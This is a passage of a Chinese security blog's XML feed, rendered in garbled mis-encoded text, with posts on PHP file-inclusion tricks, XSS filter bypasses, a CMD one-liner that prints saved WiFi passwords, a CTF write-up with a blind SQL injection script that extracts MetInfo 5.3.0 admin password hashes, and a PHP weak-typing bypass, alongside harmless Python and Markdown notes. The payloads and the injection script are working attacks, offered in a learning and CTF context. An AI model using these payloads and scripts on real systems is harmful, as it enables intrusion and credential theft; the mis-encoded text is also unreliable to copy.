6.æ‰“å¼€webæœåŠ¡å™¨çš„dataç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶å·²ç»æˆåŠŸçš„å†™åˆ°äº†webæœåŠ¡å™¨ä¸­ã€‚DedeCMS-5.7-UTF8-SP1\uploads 7.æˆ‘ä»¬è®¿é—®ä¸€ä¸‹ 8.æ¼æ´åˆ©ç”¨æˆåŠŸ 0x06 æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æŠ€å·§è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ä¹‹æ‰€ä»¥èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå°±æ˜¯å› ä¸ºæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰è¢«åŒ…å«çš„æ–‡ä»¶å†…å®¹ã€‚å› æ­¤ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¦æƒ³æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿéœ€è¦æ‰¾ä¸€ä¸ªæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶å†…å®¹çš„æœ¬åœ°æ–‡ä»¶ã€‚ ç›®å‰ä¸»è¦æœ‰å‡ ä¸‹å‡ ç§å¸¸è§çš„æŠ€å·§ï¼š 0x06_1 PHPåŒ…å«è¯»æ–‡ä»¶ php://filter/read=convert.base64-encode/resource=login.php 0x06_2 PHPåŒ…å«å†™æ–‡ä»¶åŒ…å«data://æˆ–php://inputç­‰ä¼ªåè®®ã€‚è¿™éœ€è¦ç›®æ ‡æœåŠ¡å™¨æ”¯æŒï¼ŒåŒæ—¶è¦æ±‚allow_url_fopenä¸ºè®¾ç½®ä¸ºONã€‚ http://ip_address/?page=php://input å¹¶ä¸”POSTæ•°æ®ä¸º&lt;?php system(&apos;net user&apos;);?&gt; 0x06_3 åŒ…å«æ—¥å¿—æ–‡ä»¶å½“æŸä¸ªPHPæ–‡ä»¶å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå´æ— æ³•ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œè¿™å°±æ„å‘³ç€æœ‰åŒ…å«æ¼æ´å´ä¸èƒ½æ‹¿æ¥åˆ©ç”¨ï¼Œè¿™æ—¶å°±å¯ä»¥åˆ©ç”¨apacheæ—¥å¿—æ–‡ä»¶æ¥å…¥ä¾µ ApacheæœåŠ¡å™¨è¿è¡Œåä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œaccess.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼Œapacheä¼šè®°å½•ä¸‹æˆ‘ä»¬çš„æ“ä½œï¼Œå¹¶å†™å…¥åˆ°è®¿é—®æ—¥å¿—access.logä¹‹ä¸­ã€‚ è®¿é—® http://ip_address/?page=../../../../Apache-20/logs/access.log 0x06_4 æˆªæ–­åŒ…å«åªé€‚åˆäºmagic_quotes_gpc=offçš„æ—¶å€™ã€‚ hhtp://ip_address/?page=1.jpg%00 0x06_5 PHPå†…ç½®åè®®file:///var/www/html è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; è®¿é—®FTP(s) URLs data:// æ•°æ®æµ http:// â€” è®¿é—® HTTP(s) URLs ftp:// â€” è®¿é—® FTP(s) URLs php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ zlib:// â€” å‹ç¼©æµ data:// â€” Data (RFC 2397) glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ phar:// â€” PHP Archive ssh2:// â€” Secure Shell 2 rar:// â€” RAR ogg:// â€” Audio streams expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ 0x06_6 åŒ…å«Sessionæ–‡ä»¶ã€‚è¿™éƒ¨åˆ†éœ€è¦æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶éƒ¨åˆ†Sessionæ–‡ä»¶çš„å†…å®¹ï¼ŒPHPé»˜è®¤ç”Ÿæˆçš„Sessionæ–‡ä»¶ä¸€èˆ¬å­˜æ”¾åœ¨/tmpç›®å½•ä¸‹ã€‚ 0x06_7 åŒ…å«/proc/self/environæ–‡ä»¶ã€‚ http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ è¿™ä¸ªä¹Ÿæ˜¯ä¸€ç§é€šç”¨çš„æŠ€å·§ï¼Œå› ä¸ºå®ƒæ ¹æœ¬ä¸éœ€è¦çŒœæµ‹è¢«åŒ…å«æ–‡ä»¶çš„è·¯å¾„ï¼ŒåŒæ—¶ç”¨æˆ·ä¹Ÿèƒ½æ§åˆ¶å®ƒçš„å†…å®¹ï¼Œå¸¸è§çš„åšæ³•æ˜¯å‘User-Agentä¸­æ³¨å…¥PHPä»£ç æ¥å®Œæˆæ”»å‡»ã€‚ è¡¥å……å¼ºåŠ›æ¨èä¸€ç¯‡æ–‡ç« ï¼šLFIã€RFIã€PHPå°è£…åè®®å®‰å…¨é—®é¢˜å­¦ä¹ ]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>PHP</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSç»•è¿‡ä¸é˜²å¾¡æ€»ç»“]]></title>
    <url>%2F2016%2F07%2F18%2FXSS%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[è·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting)ï¼Œä¸ºä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSã€‚æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚ 0x01 XSSçš„åˆ†ç±» åå°„å‹ï¼ˆéæŒä¹…å‹ï¼‰ å­˜å‚¨å‹ï¼ˆæŒä¹…å‹ï¼‰ DOMå‹ å…·ä½“çš„ä¸€äº›ä»‹ç»ä¸ç®€å•çš„å®ä¾‹å°±ä¸åšè¯¦è¿°äº†ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»çš„æ˜¯XSSçš„ç»•è¿‡æŠ€å·§ä¸é˜²å¾¡ã€‚ 0x02 XSSçš„ç»•è¿‡å¤§å°å†™ç»•è¿‡&lt;ScRIpT&gt;alert(&apos;123&apos;)&lt;/sCRIpT&gt; ç¼–ç ç»•è¿‡1.åå…­è¿›åˆ¶ç¼–ç  2.jsfuckç¼–ç  3.urlç¼–ç  4.unicodeç¼–ç  &lt;0x736372697074&gt;alert(&apos;123&apos;)&lt;/0x736372697074&gt; &lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt; &apos;è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†&apos;å†™ä¸º &amp;#x27 å°†&quot;/&quot;è½¬ä¹‰ä¸º&quot;&amp;sol;&quot; ç»•è¿‡magic_quotes_gpc&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; é—­åˆæ ‡ç­¾&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt; &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; æ ‡ç­¾ç»•è¿‡&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt; &lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt; &lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt; &quot;onsubmit=javascript:alert(1)%20name=&quot;a å…¶ä»–ç¬¦å·ç»•è¿‡%0aalert(1); %0a æ¢è¡Œç¬¦ /**/ æ›¿æ¢ç©ºæ ¼ %00 æˆªæ–­ åŒå­—æ¯ç»•è¿‡&lt;img ononerrorerror=&quot;123&quot;&gt; &lt;script&gt;alalertert(123)&lt;/script&gt; å®½å­—èŠ‚ç»•è¿‡gbxxxxç³»åˆ—çš„ç¼–ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€ä¸‹å®½å­—èŠ‚ %c0 %bf %5c å…¶ä»–äº‹ä»¶ç»•è¿‡onload onclick onerror prompt confirm onmousemove CRLF injectionç»•è¿‡CRLFæ˜¯â€å›è½¦ + æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ã€‚ http://www.xxx.com%0d%0a%0d%0a+xssä»£ç  &lt;svg/onload=prompt(1)&gt; 0x03 XSSçš„é˜²å¾¡ åŸåˆ™1ï¼šâ€œSecure By Defaultâ€åŸåˆ™ï¼šä¸è¦å¾€HTMLé¡µé¢ä¸­æ’å…¥ä»»ä½•ä¸å¯ä¿¡æ•°æ® åŸåˆ™2ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLæ ‡ç­¾ä¹‹é—´æ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTML Entityç¼–ç  åŸåˆ™3ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTMLå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒHTMLå±æ€§ç¼–ç  åŸåˆ™4ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°SCRIPTé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒSCRIPTç¼–ç  åŸåˆ™5ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°Styleå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒCSSç¼–ç  åŸåˆ™6ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTML URLé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒURLç¼–ç  åŸåˆ™7ï¼šä½¿ç”¨å¯Œæ–‡æœ¬æ—¶ï¼Œä½¿ç”¨XSSè§„åˆ™å¼•æ“è¿›è¡Œç¼–ç è¿‡æ»¤]]></content>
      <tags>
        <tag>CRLF</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonç»ƒä¹ é¢˜]]></title>
    <url>%2F2016%2F07%2F16%2Fpython%E7%BB%83%E4%B9%A0%E9%A2%98%2F</url>
    <content type="text"><![CDATA[ä¸¤ä¸ªpythonç»ƒä¹ çš„å°è„šæœ¬ï¼Œæ¶‰åŠæ­£åˆ™è¡¨è¾¾å¼ï¼Œç½‘é¡µçˆ¬è™«åŠä¿¡æ¯æå–ã€‚ ä¹ é¢˜1ï¼šä»æ–‡æœ¬ä¸­åŒ¹é…è‹±æ–‡å•è¯ä»£ç ï¼š #!usr/bin/python #coding=utf-8 &apos;&apos;&apos; @authorï¼šw2n1ck &apos;&apos;&apos; import re #è½½å…¥æ­£åˆ™è¡¨è¾¾å¼æ¨¡å— f1 = open(&apos;from.txt&apos;) data = f1.read() f1.close() #æ‰“å¼€æ–‡ä»¶ï¼Œè¯»å…¥æ–‡æœ¬ result = re.findall(&apos;[A-z]+&apos;, data) #ç”¨æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„findallæ–¹æ³• #æ‰¾å‡ºdataä¸­æ‰€æœ‰ä»A-Za-zçš„è¿ç»­å­—ç¬¦ result.sort() #æŠŠå¾—åˆ°çš„ç»“æœå­—ç¬¦ä¸²listæ’åºï¼Œé»˜è®¤ä¸ºå­—å…¸åº data = &apos;\n&apos;.join(result) #æŠŠæ’åºåçš„ç»“æœç”¨æ¢è¡Œç¬¦è¿æ¥æˆä¸€æ®µæ–‡æœ¬ f2 = open(&apos;to.txt&apos;, &apos;w&apos;) f2.write(data) f2.close() #è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ from.txtå†…å®¹å¦‚ä¸‹ï¼š ç»“æœå¦‚ä¸‹ï¼š ä¹ é¢˜2ï¼š æŸ¥è¯¢çƒ­æ˜ ç”µå½±æŸ¥è¯¢å½“å‰æ­£åœ¨çƒ­æ˜ çš„ç”µå½±ã€‚æ–¹æ³•æ˜¯ï¼Œæ‰¾ä¸€ä¸ªç”µå½±ç½‘ç«™ï¼ˆè±†ç“£ç”µå½±ã€æ—¶å…‰ç½‘ã€æ ¼ç“¦æ‹‰ç­‰ç­‰ï¼‰ï¼ŒæŠŠå®ƒçš„é¦–é¡µå–è¿‡æ¥ï¼Œåˆ†æä¸€ä¸‹ç½‘é¡µå†…å®¹çš„ç»“æ„ï¼Œç„¶åä»ä¸­å–å‡ºä½ è¦çš„ä¿¡æ¯ã€‚ å› ä¸ºä¸€ä¸ªç½‘é¡µä¸Šä¼šåŒ…å«å¾ˆå¤šå†…å®¹ï¼Œå¦‚ä½•æŸ¥æ‰¾å®šä½åˆ°ä½ æ‰€éœ€çš„å†…å®¹ï¼Œè¿˜æ˜¯è¦è´¹ç‚¹åŠŸå¤«çš„ã€‚ä½ å¯èƒ½ä¼šç”¨åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€urllibï¼Œæˆ–è€…BeautifulSoupä¹‹ç±»çš„ã€‚ é¦–å…ˆå®‰è£…ç¬¬ä¸‰æ–¹çš„ç½‘é¡µåˆ†ææ¨¡å—ï¼šBeautifulSoup ä»£ç ï¼š #!usr/bin/python #coding:utf-8 &apos;&apos;&apos; @authorï¼šw2n1ck &apos;&apos;&apos; import urllib2 from bs4 import BeautifulSoup print &quot;è±†ç“£æ­£åœ¨çƒ­æ˜ ï¼š&quot; url = &quot;http://movie.douban.com&quot; html = urllib2.urlopen(url).read() soup = BeautifulSoup(html) div_hot = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;screening&quot;}) for i in div_hot.find_all(&apos;li&apos;, class_=&apos;title&apos;): movie_title = i.a.get_text() # movie_title = movie_title.strip() #å»é™¤movie_titleä¸¤è¾¹çš„ç©ºæ ¼ print movie_title print &quot;\nè±†ç“£è¿‘æœŸçƒ­é—¨ï¼š&quot; div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;hot-gallery&quot;}) for i in div_new.find_all(&apos;li&apos;, class_=&apos;title&apos;): movie_new = i.a.get_text() print movie_new ä»£ç è§£æï¼š 7ã€8è¡Œåˆ†åˆ«å¯¼å…¥äº†urllib2ã€beautifulsoupæ¨¡å— 11è¡Œç”¨urllibæ¨¡å—æŠŠè±†ç“£çš„ç½‘é¡µæŠ“ä¸‹æ¥ 12è¡Œç”¨BeautifulSoupæ¨¡å—æ•´ç†æŠ“ä¸‹æ¥çš„htmlå†…å®¹ 13è¡Œæ˜¯é‡ç‚¹ï¼ŒæŠŠæˆ‘ä»¬éœ€è¦çš„é‚£ä¸€éƒ¨åˆ†divæˆªå–ä¸‹æ¥ï¼ˆid=â€screeningâ€çš„é‚£éƒ¨åˆ†ï¼‰ï¼Œéœ€è¦åˆ†æhtmlæºç ã€‚ æ¥ä¸‹æ¥åœ¨ä¸Šæ–‡çš„divä¸­ï¼Œå¯»æ‰¾æ‰€æœ‰ class=â€titleâ€ çš„ li å…ƒç´ ï¼Œæ³¨æ„ï¼Œç”±äº class_æ˜¯pythonä¸­çš„ä¿ç•™å…³é”®å­—ï¼Œæ‰€ä»¥éœ€è¦ class_=&#39;title&#39;ã€‚ æœ‰äº›ç½‘é¡µæŠ“å–å‡ºæ¥çš„å†…å®¹å‰åæœ‰å¾ˆå¤šç©ºæ ¼ï¼Œå¯ä»¥ç”¨.strip() å»é™¤ã€‚]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>çˆ¬è™«</tag>
        <tag>Python</tag>
        <tag>æ­£åˆ™è¡¨è¾¾å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CMDå‘½ä»¤è·å–ç”µè„‘æ‰€æœ‰è¿æ¥è¿‡çš„WiFiå¯†ç ]]></title>
    <url>%2F2016%2F07%2F16%2FCMD%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E6%89%80%E6%9C%89%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84WiFi%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[CMDå¹³å¸¸äººçœ‹èµ·ä¾†æ ¹æœ¬æ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¦‚æœä½ ä¼šä½¿ç”¨ï¼Œä½ ä¼šå‘ç°ï¼šå®ƒçœŸçš„å¾ˆå¼ºå¤§ï¼ Windows 7ã€Windows 8ã€Windows 8.1ã€Windows 10å·²æµ‹è¯•æˆåŠŸï¼ï¼ˆwindows 7ä¸‹ä»¥ç®¡ç†å‘˜æ–¹å¼è¿è¡Œï¼‰ ä½¿ç”¨æ–¹æ³•ï¼šä¸€ã€ä»¥ç®¡ç†å‘˜æƒé™è¿è¡ŒCMD ï¼ˆä»¥åŠ å¼€å¯æ— çº¿ç½‘å¡ã€æœ€å¥½æ˜¯ç¬”è®°æœ¬ï¼‰ äºŒã€è¾“å…¥å‘½ä»¤ï¼š for /f â€œskip=9 tokens=1,2 delims=:â€ %i in (â€˜netsh wlan show profilesâ€™) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear ä¸‰ã€ç„¶åCMDå°±åˆ—å‡ºå¾ˆå¤šè¡Œ ä½ ä»¥å‰è¿æ¥è¿‡çš„wifiä¿¡æ¯ã€åŠ å¯†æ–¹å¼ã€åŒ…æ‹¬å¯†ç ]]></content>
      <tags>
        <tag>è¿ç»´</tag>
        <tag>çˆ†ç ´</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å®éªŒå§ç»¼åˆæ¸—é€_metinfo_ç›²æ³¨è„šæœ¬]]></title>
    <url>%2F2016%2F07%2F14%2F%E5%AE%9E%E9%AA%8C%E5%90%A7%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F-metinfo-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[MetInfo5.3.0 ç‰ˆæœ¬SQLæ³¨å…¥ã€‚åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œåˆ†æå¦‚ä¸‹: è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯listmod.phpï¼Œä»£ç çš„æœ€åä¸€è¡Œ$serch_sql æ€ä¹ˆåšèƒ½è®©è¿™ä¸ªæ²¡æœ‰åœ¨ä¸Šé¢ç»™åˆå§‹åŒ–ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦åšçš„ã€‚ é€šè¿‡è°ƒè¯•ï¼š æˆ‘ä»¬çš„çŸ¥ æ§åˆ¶å®ƒæ˜¯å¦åˆå§‹åŒ–çš„å¦ä¸€ä¸ªå˜é‡ä¸ºimgproduct å½“è¿™ä¸ªå˜é‡ésearchçš„ä»»æ„å­—ç¬¦çš„æ—¶å€™ï¼Œå¯¼è‡´serch_sql ä¸èƒ½è¿›è¡Œåˆå§‹åŒ– æ„é€ POCï¼š http://localhost/MetInfo5.3/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1â€“ sd&amp;imgproduct=xxxx è¿™æ ·ä¸€æ¥ æ¯”sqlæ³¨å…¥æ›´ä¸ºç®€å•äº†97é‚£ä¸ªä½ç½®ï¼Œç„¶ååœ¨åˆ¤æ–­ç¬¬äºŒä½ï¼Œå†ç©·èš,è‡ªç„¶å°±çˆ†è¡¨äº†ã€‚ å®ä¾‹å®éªŒå§ç»¼åˆæ¸—é€metinfoã€‚ æœ¬é¢˜ç¯å¢ƒå°±æ˜¯è¿™ä¸ªï¼Œæ ¹æ®POCå†™å¦‚ä¸‹è„šæœ¬ï¼š # -*- coding: utf8 -*- import httplib import requests import urllib import string payloads = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos; url=&quot;http://localhost:8080/MetInfo_v5.3.0/&quot; password = &apos;&apos; for p in range(1, 33): for num in payloads: num = ord(num) poc = &quot;http://localhost:8080/MetInfo_v5.3.0/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_pass,&quot;+str(p)+&quot;,1))=&quot;+str(num)+&quot;,1,0) limit 0,1-- sd&amp;imgproduct=xxxx&quot; #print poc #result = urllib.request.urlopen(poc).txt conn = requests.get(poc) res = conn.content res = str(res) if res.find(r&quot;ä¸ºä»€ä¹ˆä¼ä¸šè¦å»ºå¤šå›½è¯­è¨€ç½‘ç«™&quot;)&gt;0: password = password + chr(num) print password break æµ‹è¯•æ•ˆæœå¦‚ä¸‹ï¼š æ ¹æ®å¦‚ä¸Šè„šæœ¬è·‘å‡ºè´¦æˆ·å¯†ç ä¸ºï¼š acd131fce58f4d6f86e4a503a303fa4e simpleware123 è¿™ä¸ªè¦æ”¶è´¹ï¼Œé™„ä¸€ä¸ªMD5è§£å¯†çš„å…è´¹ç½‘å€ï¼šhttp://www.pdtools.net/tools/md5.jsp]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>SQLæ³¨å…¥</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MarkDownåŸºç¡€è¯­æ³•]]></title>
    <url>%2F2016%2F07%2F13%2FMarkDown%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Markdownå…¥é—¨å­¦ä¹ å°ç»“Markdownæ˜¯ä¸€ç§å¯ä»¥ä½¿ç”¨æ™®é€šæ–‡æœ¬ç¼–è¾‘å™¨ç¼–å†™çš„æ ‡è®°è¯­è¨€ï¼Œé€šè¿‡ç®€å•çš„æ ‡è®°è¯­æ³•ï¼Œå®ƒå¯ä»¥ä½¿æ™®é€šæ–‡æœ¬å†…å®¹å…·æœ‰ä¸€å®šçš„æ ¼å¼ã€‚Markdown çš„ç›®æ ‡æ˜¯å®ç°ã€Œæ˜“è¯»æ˜“å†™ã€ã€‚ æ ‡é¢˜åœ¨Markdownå½“ä¸­è®¾ç½®æ ‡é¢˜ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š ç¬¬ä¸€ç§ï¼šé€šè¿‡åœ¨æ–‡å­—ä¸‹æ–¹æ·»åŠ â€œ=â€å’Œâ€œ-â€ï¼Œä»–ä»¬åˆ†åˆ«è¡¨ç¤ºä¸€çº§æ ‡é¢˜å’ŒäºŒçº§æ ‡é¢˜ã€‚ ç¬¬äºŒç§ï¼šåœ¨æ–‡å­—å¼€å¤´åŠ ä¸Š â€œ#â€ï¼Œé€šè¿‡â€œ#â€æ•°é‡è¡¨ç¤ºå‡ çº§æ ‡é¢˜ã€‚ï¼ˆä¸€å…±åªæœ‰1~6çº§æ ‡é¢˜ï¼Œ1çº§æ ‡é¢˜å­—ä½“æœ€å¤§ï¼‰ å—æ³¨é‡Š(å¼•ç”¨) é€šè¿‡åœ¨æ–‡å­—å¼€å¤´æ·»åŠ â€œ&gt; â€è¡¨ç¤ºå—æ³¨é‡Šã€‚ ç²—ä½“ï¼ˆå¼ºè°ƒï¼‰ å°†éœ€è¦è®¾ç½®ä¸ºç²—ä½“çš„æ–‡å­—ä¸¤ç«¯ä½¿ç”¨2ä¸ªâ€œ*â€ã€‚ æœ‰åºåˆ—è¡¨ ä½¿ç”¨æ•°å­— åé¢è·Ÿä¸Šå¥å·ã€‚ ï¼ˆè¿˜è¦æœ‰ç©ºæ ¼ï¼‰ é“¾æ¥ï¼ˆLinksï¼‰Markdownä¸­æœ‰ä¸¤ç§æ–¹å¼ï¼Œå®ç°é“¾æ¥ï¼Œåˆ†åˆ«ä¸ºå†…è”æ–¹å¼å’Œå¼•ç”¨æ–¹å¼ã€‚ å†…è”æ–¹å¼ï¼šThis is an example link. This is an [example link](http://example.com/). å›¾ç‰‡ï¼ˆImagesï¼‰å›¾ç‰‡çš„å¤„ç†æ–¹å¼å’Œé“¾æ¥çš„å¤„ç†æ–¹å¼ï¼Œéå¸¸çš„ç±»ä¼¼ã€‚ å†…è”æ–¹å¼ï¼š ![test](C:\Users\dell\Pictures\404.jpg) ç›´æ¥ä½¿ç”¨æ ‡ç­¾ï¼Œè¿™æ ·å¯ä»¥æŒ‡å®šå›¾ç‰‡çš„å¤§å°å°ºå¯¸ä»£ç ï¼ˆHTMLä¸­æ‰€è°“çš„Codeï¼‰å®ç°æ–¹å¼æœ‰ä¸¤ç§ï¼šç¬¬ä¸€ç§ï¼šç®€å•æ–‡å­—å‡ºç°ä¸€ä¸ªä»£ç æ¡†ã€‚ä½¿ç”¨&lt;blockquote&gt;ã€‚ï¼ˆä¸æ˜¯å•å¼•å·è€Œæ˜¯å·¦ä¸Šè§’çš„ESCä¸‹é¢~ä¸­çš„ï¼‰```ç¬¬äºŒç§ï¼šå¤§ç‰‡æ–‡å­—éœ€è¦å®ç°ä»£ç æ¡†ã€‚ä½¿ç”¨Tabå’Œå››ä¸ªç©ºæ ¼ã€‚ç‰¹æ®Šå­—ç¬¦ ç”¨\è½¬ä¹‰ã€‚]]></content>
      <tags>
        <tag>MarkDown</tag>
        <tag>åšå®¢</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ã€PHPå®‰å…¨ã€‘PHPå¼±ç±»å‹]]></title>
    <url>%2F2016%2F06%2F13%2F%E3%80%90PHP%E5%AE%89%E5%85%A8%E3%80%91PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[æ²¡æœ‰äººè´¨ç–‘phpçš„ç®€å•å¼ºå¤§ï¼Œå®ƒæä¾›äº†å¾ˆå¤šç‰¹æ€§ä¾›å¼€å‘è€…ä½¿ç”¨ï¼Œå…¶ä¸­ä¸€ä¸ªå°±æ˜¯å¼±ç±»å‹æœºåˆ¶ã€‚å¼±ç±»å‹çš„è¯­è¨€å¯¹å˜é‡çš„æ•°æ®ç±»å‹æ²¡æœ‰é™åˆ¶ï¼Œä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ—¶å€™å°†å˜é‡èµ‹å€¼ç»™ä»»æ„çš„å…¶ä»–ç±»å‹çš„å˜é‡ï¼ŒåŒæ—¶å˜é‡ä¹Ÿå¯ä»¥è½¬æ¢æˆä»»æ„åœ°å…¶ä»–ç±»å‹çš„æ•°æ®ã€‚ PHPå¼±ç±»å‹ PHPå¼±ç±»å‹ç®€ä»‹åœ¨PHPä¸­ï¼Œå¯ä»¥è¿›è¡Œä¸€ä¸‹çš„æ“ä½œã€‚ $param = 1; $param = array(); $param = &quot;stringg&quot;; æ¯”å¦‚ åœ¨$a == $bçš„æ¯”è¾ƒä¸­ $a = null; $b = false; //ä¸ºçœŸ $a = â€˜â€™; $b = 0; //åŒæ ·ä¸ºçœŸå®ä¾‹è§£é‡Š å®ä¾‹ä¸€2016å¹´é£äº‘æ¯çš„é¢˜ é¢˜ç›®å°±æ˜¯ä¸€ä¸ªç™»é™†æ¡†ï¼Œéœ€è¦è¾“å…¥è´¦å·å¯†ç ã€‚ postï¼šusername[]=1&amp;password[]=2 åŸå› æ˜¯ï¼šç”¨æˆ·åœ¨è¾“å…¥è´¦å·å¯†ç ä¹‹åphpä¼šè¿›è¡Œè§£æï¼Œé¦–å…ˆä¼šæŠŠusernameå’Œpasswordå½“æˆæ•°ç»„ï¼Œusernameå’Œpasswordå†MD5åŠ å¯†ä¹‹åå°±å˜å¾—å’Œæ•°æ®åº“ä¸­ç›¸åŒï¼Œè¿™æ ·å°±æˆåŠŸç™»é™†ã€‚ å®ä¾‹äºŒä¹Ÿæ˜¯2016å¹´é£äº‘æ¯çš„é¢˜ é¦–å…ˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæ‹¿åˆ°æºç  ä»£ç å¦‚ä¸‹ï¼š &lt;?php $_GET[â€˜myidâ€™] = urldecode($_GET[â€˜myidâ€™]); $flag = â€˜xxxxxxxxxxxxxxxxxâ€™; if (isset($_GET[â€˜nameâ€™]) and isset($_POST[â€˜passwordâ€™])) { if ($_GET[&apos;name&apos;] == $_POST[&apos;password&apos;]) print &apos;Your password can not be your name.&apos;; else if (sha1($_GET[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;])&amp;($_GET[&apos;myid&apos;]==&apos;anyun&apos;)) die(&apos;Flag: &apos;.$flag); else print &apos;sorry!&apos;; } ?&gt; é¦–å…ˆå¯¹myidè¿›è¡Œä¸€ä¸ªurldecode ç„¶ååˆ¤æ–­æ˜¯å¦è®¾ç½®nameå’Œpassword å†ç„¶ååˆ¤æ–­sha1ï¼ˆnameï¼‰å’Œsha1ï¼ˆpasswordï¼‰æ˜¯å¦ç›¸ç­‰ï¼Œå¹¶ä¸”myid=anyun 